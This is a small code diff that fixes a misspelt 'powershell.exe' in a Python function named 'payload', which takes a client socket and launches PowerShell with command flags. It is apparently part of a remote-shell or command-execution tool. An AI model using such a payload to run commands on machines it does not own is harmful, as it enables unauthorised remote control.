@@ -180,7 +180,7 @@ def payload(target:TerminalSimulator, client:socket, BUFFER=4096, TIMEOUT=10):
     try:
         if target.os == "Windows":
             process = subprocess.Popen(
-                ["poweshell.exe",
+                ["powershell.exe",
                  "-NoLogo",
                  "-NoProfile",
                  "-Command",
